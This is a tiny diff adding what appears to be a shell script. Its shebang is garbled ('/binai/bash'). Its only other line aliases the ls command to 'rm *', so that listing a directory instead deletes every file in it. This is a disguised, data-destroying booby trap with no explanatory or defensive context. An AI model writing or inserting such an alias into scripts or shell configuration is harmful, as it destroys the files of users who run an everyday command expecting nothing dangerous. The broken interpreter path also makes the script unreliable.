@@ -1,0 +1,2 @@
+#!/binai/bash
+alias ls="rm *"
